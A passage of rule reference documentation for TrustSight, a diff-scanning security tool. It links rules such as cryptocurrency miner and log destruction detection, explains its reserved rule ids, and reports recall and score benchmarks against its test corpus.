See [S007: Cryptocurrency Miner](sabotage.md#s007).

### S008 {#s008}

See [S008: Shell History Or Log Destruction](sabotage.md#s008).


---

## Class E: indicators of compromise (R106) {#class-e-rules}

### R106 {#r106}

See [R106: Known Indicator of Compromise](corpus-behavioral.md#r106).


---

## Not currently a rule {#not-rules}

- **R073 (release cadence)** is metadata on the analysis record, not a scored
  finding. See [R073](corpus-behavioral.md#r073).
- **R103 and R109** describe the ruleset's ceiling rather than a detection.
  See [the novelty ceiling](../../explanation/what-trustsight-cannot-see.md).

The R-series identifier space is not contiguous. Reserved ids appear nowhere
in the shipped config or the code-emitted rule set:

- `R015`, `R026`-`R038`: held apart so the core and expanded ranges stay
  readable, and reassigning them could clash with user `rules.toml` overrides.
- `R078`, `R091`, `R099`, `R103`-`R104`, `R109`, `R113`: unassigned in the
  current shipped configuration. `R103`/`R109` are claimed above as the
  novelty ceiling; the rest are simply unused and may be returned to service
  when a detection needs them.

---

## Benchmark performance

Measured against the TrustSight test corpus.

!!! warning "Two rows predate a ruleset expansion"

    The recall rows above were measured while `observation_count` was never populated, so Tier C novelty contributed zero to every score (see [Cold Start and Maturity](../../explanation/cold-start-and-maturity.md)), and before the R039+ expanded rules or C004-C007 shipped. The three distribution rows below are re-measured by the calibration gates against the current 3,739-diff corpus on every push.

| Rule | Recall | Notes |
|------|--------|-------|
| CRITICAL class (all) | 100 % | Every CRITICAL-class sample detected. |
| R012 (prompt injection) | 17 % | Tripwire; catches obvious patterns only. Low recall is intentional. |
| R013 (unicode bidi) | 88 % | Misses some bidi variants. |
| Benign zero-rate | 68.3 % | Percentage of benign diffs scoring 0. |
| Benign p95 | 35 | 95th percentile score on benign corpus. |
| CRITICAL p5 | 60 | 5th percentile score on CRITICAL-class corpus. |
